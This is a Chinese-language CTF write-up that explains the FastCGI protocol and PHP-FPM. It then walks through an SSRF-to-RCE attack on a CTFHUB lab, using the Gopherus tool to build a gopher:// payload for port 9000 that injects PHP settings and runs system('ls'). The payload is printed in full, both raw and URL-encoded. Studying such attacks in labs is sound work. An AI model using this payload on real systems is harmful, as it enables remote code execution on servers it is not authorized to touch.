### FastCGI 协议 RCE

话不多说，直接上题（CTFHUB）

![](https://pic1.imgdb.cn/item/687f45ee58cb8da5c8cb212f.png)

**1️⃣ FastCGI 简介**

FastCGI 是一种通用网关接口（CGI）的改进版本，旨在解决传统 CGI 存在的性能问题

传统  CGI  每次请求都会创建一个新的进程，处理完请求后销毁，极大浪费系统资源

而 FastCGI 通过长连接与进程复用机制，显著提高了性能

FastCGI 通常用于：

- Web 服务器（如 Nginx、Apache）与后端应用（如 PHP-FPM）之间的通信
- 保持后端服务进程常驻，提高高并发下的性能

**2️⃣ FastCGI 架构概览**

通信双方：

- Web 服务器：客户端请求入口，如 Nginx
- FastCGI 应用程序：通常是 PHP-FPM 或其他应用服务器

工作流程：

```css
[客户端浏览器] 
     ↓
[Web 服务器 (如 Nginx)]  ——TCP/Unix Socket——>  [FastCGI 后端 (如 PHP-FPM)]
```

- Web 服务器把请求封装成 FastCGI 协议格式，通过 Socket 发给 FastCGI 进程
- FastCGI 进程解析请求，执行后端逻辑，返回响应数据
- Web 服务器再将结果返还给客户端

**3️⃣ FastCGI 协议结构**

数据传输的基本单位：Record（记录）

每个 Record 有固定头部格式和可变长度的数据部分。

Record Header（8 字节）结构：

| 字段          | 大小（字节） | 说明                     |
| ------------- | ------------ | ------------------------ |
| Version       | 1            | FastCGI 版本，通常是 `1` |
| Type          | 1            | 记录类型（见下表）       |
| RequestId     | 2            | 请求 ID（用于多路复用）  |
| ContentLength | 2            | 内容长度                 |
| PaddingLength | 1            | 填充字节长度（用于对齐） |
| Reserved      | 1            | 保留，通常为 `0`         |

常见 Type 类型：

| 类型名             | 值   | 说明                         |
| ------------------ | ---- | ---------------------------- |
| FCGI_BEGIN_REQUEST | 1    | 表示开始一个请求             |
| FCGI_ABORT_REQUEST | 2    | 表示中断请求                 |
| FCGI_END_REQUEST   | 3    | 表示请求结束                 |
| FCGI_PARAMS        | 4    | 发送请求的环境变量           |
| FCGI_STDIN         | 5    | 发送请求主体（如 POST 数据） |
| FCGI_STDOUT        | 6    | 标准输出（返回内容）         |
| FCGI_STDERR        | 7    | 标准错误（返回错误信息）     |
| FCGI_DATA          | 8    | 补充数据（很少用）           |

**4️⃣ 通信过程详细步骤**

一次 HTTP 请求通常包含以下 FastCGI Record：

```sh
① FCGI_BEGIN_REQUEST        # 开始请求
② FCGI_PARAMS (多次)         # 环境变量（如 PATH_INFO、QUERY_STRING 等）
③ FCGI_PARAMS (空)           # 空表示结束
④ FCGI_STDIN (可能多次)      # 请求体，如 POST 数据
⑤ FCGI_STDIN (空)            # 空表示结束
----------------------------
⑥ FCGI_STDOUT (返回内容)
⑦ FCGI_STDERR (错误信息)
⑧ FCGI_END_REQUEST           # 通知请求结束
```

**5️⃣ 请求示例（伪过程）**

```http
客户端发起 HTTP 请求：GET /index.php?id=1

Nginx 生成 FastCGI 请求：
1️⃣ 发送 BEGIN_REQUEST
2️⃣ 发送 PARAMS（SCRIPT_FILENAME, QUERY_STRING 等）
3️⃣ 发送空 PARAMS
4️⃣ （GET 没有 STDIN）
5️⃣ 等待 FastCGI 返回数据
```

FastCGI 返回：

- STDOUT: 输出 HTML 内容
- STDERR: 错误日志（如果有）
- END_REQUEST: 请求结束

**6️⃣ PHP-FPM 简介**

PHP-FPM 是专门为 **PHP 提供更高效、更稳定的进程管理机制的 FastCGI 实现**，常用于配合 Nginx 部署 PHP 网站

```
浏览器请求 --> Nginx --> PHP-FPM --> PHP 脚本执行 --> 返回结果
```

**7️⃣攻击原理**

```lua
+----------------------+
|   攻击者发起请求     |
+----------------------+
            |
            v
+----------------------------------+
| PHP-FPM 端口 9000 是否暴露公网？    |
+----------------------------------+
      |                      |
      | 是                   | 否
      v                      v
+------------------+   +-------------------+
|  直接构造 FastCGI|   |  SSRF 访问 127.0.0.1|
|   数据包攻击FPM  |   |   请求 FastCGI 端口  |
+------------------+   +-------------------+
      |                      |
      +----------+-----------+
                 v
       +----------------------------+
       |   SCRIPT_FILENAME 参数控制  |
       +----------------------------+
                 |
     +-----------------------------+
     |  文件后缀是否受限制？        |
     +-----------------------------+
         |                    |
         | 老版本，不受限       | 新版本，仅限 .php
         v                    v
+----------------+     +---------------------+
| 任意文件可利用 |     | 只能利用已有 .php 文件 |
+----------------+     +---------------------+
         |                    |
         v                    v
+--------------------+  +----------------------+
| 可读取 /etc/passwd |  | 执行指定 PHP 脚本，      |
| 或其他任意文件     |  | 达成远程代码执行       |
+--------------------+  +----------------------+
```

本文要利用一个脚本 [gopherus.py](https://github.com/tarunkant/Gopherus/tree/master)，这个脚本可以对 SSRF 漏洞进行利用，可以直接生成 payload 造成远程代码执行 RCE

```sh
┌──(kali㉿kali)-[~/Gopherus]
└─$ python2 gopherus.py -h                                                             
usage: gopherus.py [-h] [--exploit EXPLOIT]

optional arguments:
  -h, --help         show this help message and exit
  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,
                     pymemcache, rbmemcache, phpmemcache, dmpmemcache
```

我们选择 fastcgi 的

```sh
python2 gopherus.py --exploit fastcgi
```

![](https://pic1.imgdb.cn/item/687f54a658cb8da5c8cb5640.png)

然后输入 `/var/www/index.php`，运行一下 ls

![](https://pic1.imgdb.cn/item/687f55a658cb8da5c8cb579a.png)

得到 payload

![](https://pic1.imgdb.cn/item/687f55c758cb8da5c8cb57bf.png)

```http
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

再做一次 URL 编码（因为走的是 `?url`）

```http
gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

可以看到有个 `index.php`

![](https://pic1.imgdb.cn/item/687f5ca658cb8da5c8cb5fee.png)

重新跑一下脚本拿 flag

![](https://pic1.imgdb.cn/item/687f5d1e58cb8da5c8cb6017.png)

成功拿到 flag

![](https://pic1.imgdb.cn/item/687f5e2858cb8da5c8cb609a.png)
